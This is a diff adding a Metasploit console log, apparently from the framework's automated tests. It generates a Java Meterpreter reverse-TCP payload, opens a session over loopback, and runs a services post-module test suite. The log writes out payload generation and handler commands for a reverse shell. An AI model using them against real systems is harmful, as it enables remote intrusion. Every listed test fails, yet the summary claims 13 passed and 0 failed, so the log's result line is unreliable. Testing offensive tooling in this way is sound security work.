@@ -1,0 +1,49 @@
+use java/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 52 closed.
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220124-6852-19pkgmz.jar -f jar spawn=0 lport=6057 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5265 bytes to D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220124-6852-19pkgmz.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 52
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6057 
+[*] Sending stage (58082 bytes) to 127.0.0.1
+[*] Meterpreter session 53 opened (127.0.0.1:6057 -> 127.0.0.1:50259 ) at 2022-01-24 02:00:44 +0000
+use test/services
+[4mmsf6[0m post([1m[31mtest/services[0m) [0m> run session=53 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * unloadable Meterpreter extension: extapi
+[*] Running against session 53
+[*] Session type is meterpreter and platform is windows
+[-] FAILED: should modify config on a given service aYRjaF
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should list services
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (java/windows)
+[-] FAILED: should start a disabled service aBwdkS
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should return info on a given service  winmgmt
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (java/windows)
+[-] FAILED: should restart a started service W32Time
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should raise a runtime exception if no access to service
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should create a service  testes
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should return info on the newly-created service testes
+[-] Exception: Rex::Post::Meterpreter::ExtensionLoadError : The "extapi" extension is not supported by this Meterpreter type (java/windows)
+[-] FAILED: should delete the new service testes
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should raise a runtime exception if services doesnt exist
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should start W32Time
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should stop W32Time
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[-] FAILED: should return status on a given service winmgmt
+[-] Exception: Rex::NotImplementedError : The requested method is not implemented.
+[*] Testing complete in 0.0358314
+[*] Passed: 13; Failed: 0
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/services[0m) [0m> 
